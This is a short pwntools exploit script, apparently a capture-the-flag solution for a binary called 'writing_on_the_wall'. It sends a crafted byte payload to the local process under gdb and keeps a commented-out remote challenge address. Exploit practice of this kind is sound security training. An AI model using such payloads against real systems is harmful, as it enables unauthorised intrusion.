#!/usr/bin/env python3

from pwn import *

exe = ELF("./writing_on_the_wall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
#p = remote('94.237.59.180',34502)
p = process()
gdb.attach(p,gdbscript='''
           brva 0x00000000000015ac
           ''')
input()
p.send(b'\x00\x00\x56\x34\x23\x12\x00')

#p.send()
p.interactive()
